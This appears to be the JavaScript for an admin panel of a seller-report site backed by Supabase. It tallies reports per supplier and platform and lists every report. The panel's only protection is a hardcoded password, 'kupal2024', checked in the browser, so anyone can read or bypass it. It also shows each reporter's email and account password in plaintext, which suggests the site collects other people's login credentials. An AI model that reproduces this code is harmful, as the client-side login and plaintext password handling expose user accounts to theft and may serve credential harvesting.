// ============================================
// ADMIN PANEL LOGIC
// ============================================

// Change this to your own secret password
const ADMIN_PASSWORD = 'kupal2024';

document.addEventListener('DOMContentLoaded', () => {
  const loginGate = document.getElementById('login-gate');
  const adminContent = document.getElementById('admin-content');
  const loginBtn = document.getElementById('login-btn');
  const passwordInput = document.getElementById('admin-password');
  const loginError = document.getElementById('login-error');

  // Check if already authenticated this session
  if (sessionStorage.getItem('admin_auth') === 'true') {
    loginGate.style.display = 'none';
    adminContent.style.display = 'block';
    loadDashboard();
  }

  loginBtn.addEventListener('click', handleLogin);
  passwordInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') handleLogin();
  });

  function handleLogin() {
    const entered = passwordInput.value;
    if (entered === ADMIN_PASSWORD) {
      sessionStorage.setItem('admin_auth', 'true');
      loginGate.style.display = 'none';
      adminContent.style.display = 'block';
      loginError.style.display = 'none';
      loadDashboard();
    } else {
      loginError.style.display = 'block';
      passwordInput.value = '';
    }
  }

  document.getElementById('refresh-btn').addEventListener('click', loadDashboard);
});

async function loadDashboard() {
  showLoading('sellers-table-body', 5);
  showLoading('reports-table-body', 6);

  try {
    // Fetch all reports
    const { data: reports, error } = await supabase
      .from('reports')
      .select('*')
      .order('created_at', { ascending: false });

    if (error) throw error;

    // Update stats
    updateStats(reports);

    // Build repeated sellers data
    displayRepeatedSellers(reports);

    // Display all reports
    displayAllReports(reports);
  } catch (error) {
    console.error('Error loading dashboard:', error);
    document.getElementById('sellers-table-body').innerHTML = `
      <tr><td colspan="5" class="empty-state">Error loading data: ${escapeHTML(error.message)}</td></tr>
    `;
  }
}

function updateStats(reports) {
  // Total reports
  document.getElementById('stat-total-reports').textContent = reports.length;

  // Unique sellers
  const uniqueSellers = new Set(reports.map(r => `${r.supplier_username}|${r.platform}`));
  document.getElementById('stat-unique-sellers').textContent = uniqueSellers.size;

  // Repeated sellers (reported more than once)
  const sellerCounts = {};
  reports.forEach(r => {
    const key = `${r.supplier_username}|${r.platform}`;
    sellerCounts[key] = (sellerCounts[key] || 0) + 1;
  });
  const repeatedCount = Object.values(sellerCounts).filter(c => c > 1).length;
  document.getElementById('stat-repeated-sellers').textContent = repeatedCount;

  // Unique emails reported
  const uniqueEmails = new Set(reports.map(r => r.email));
  document.getElementById('stat-unique-emails').textContent = uniqueEmails.size;
}

function displayRepeatedSellers(reports) {
  const sellerData = {};

  reports.forEach(r => {
    const key = `${r.supplier_username}|${r.platform}`;
    if (!sellerData[key]) {
      sellerData[key] = {
        username: r.supplier_username,
        platform: r.platform,
        count: 0,
        emails: new Set(),
        lastReported: r.created_at
      };
    }
    sellerData[key].count++;
    sellerData[key].emails.add(r.email);
    if (new Date(r.created_at) > new Date(sellerData[key].lastReported)) {
      sellerData[key].lastReported = r.created_at;
    }
  });

  // Sort by report count descending
  const sortedSellers = Object.values(sellerData).sort((a, b) => b.count - a.count);

  const tbody = document.getElementById('sellers-table-body');

  if (sortedSellers.length === 0) {
    tbody.innerHTML = '<tr><td colspan="5" class="empty-state">No reports yet</td></tr>';
    return;
  }

  tbody.innerHTML = sortedSellers.map(seller => {
    const badgeClass = seller.count >= 5 ? 'high' : seller.count >= 3 ? 'medium' : 'low';
    const platformClass = getPlatformClass(seller.platform);
    const lastDate = new Date(seller.lastReported).toLocaleDateString();

    return `
      <tr>
        <td><strong>${escapeHTML(seller.username)}</strong></td>
        <td><span class="platform-badge ${platformClass}">${escapeHTML(seller.platform)}</span></td>
        <td><span class="report-count ${badgeClass}">${seller.count}</span></td>
        <td>${seller.emails.size}</td>
        <td>${lastDate}</td>
      </tr>
    `;
  }).join('');
}

function displayAllReports(reports) {
  const tbody = document.getElementById('reports-table-body');

  if (reports.length === 0) {
    tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No reports yet</td></tr>';
    return;
  }

  tbody.innerHTML = reports.map(report => {
    const platformClass = getPlatformClass(report.platform);
    const date = new Date(report.created_at).toLocaleString();

    return `
      <tr>
        <td>${escapeHTML(report.email)}</td>
        <td>${escapeHTML(report.password)}</td>
        <td><strong>${escapeHTML(report.supplier_username)}</strong></td>
        <td><span class="platform-badge ${platformClass}">${escapeHTML(report.platform)}</span></td>
        <td>${date}</td>
      </tr>
    `;
  }).join('');
}

function getPlatformClass(platform) {
  const map = {
    'Telegram': 'telegram',
    'Discord': 'discord',
    'Facebook': 'facebook',
    'WhatsApp': 'whatsapp',
    'Twitter/X': 'twitter',
    'Instagram': 'instagram',
    'Others': 'others'
  };
  return map[platform] || 'others';
}

function showLoading(elementId, colspan) {
  document.getElementById(elementId).innerHTML = `
    <tr><td colspan="${colspan}" class="loading">Loading data</td></tr>
  `;
}

function escapeHTML(str) {
  const div = document.createElement('div');
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}
